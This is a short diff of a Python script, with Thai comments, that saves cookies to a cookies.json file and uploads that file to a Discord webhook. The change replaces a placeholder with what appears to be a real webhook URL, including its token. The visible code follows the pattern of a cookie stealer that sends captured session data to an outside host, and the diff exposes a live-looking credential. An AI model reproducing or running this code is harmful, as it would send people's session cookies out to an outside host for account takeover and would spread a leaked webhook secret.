@@ -15,7 +15,7 @@ with open('cookies.json', 'w') as file:
 print("Cookies have been saved to cookies.json")
 
 # กำหนด Webhook URL
-WEBHOOK_URL = 'https://your-discord-webhook-url'
+WEBHOOK_URL = 'https://discord.com/api/webhooks/1262428333061308486/rjzPQxwlyNV3-c4wP_RrSso80UdhwUuKFBJU9QYEnE-Hw3U-J2n5t2PBaIJNaYrvYc6K'
 
 # ส่งไฟล์ JSON ไปยัง Webhook
 with open('cookies.json', 'rb') as file:
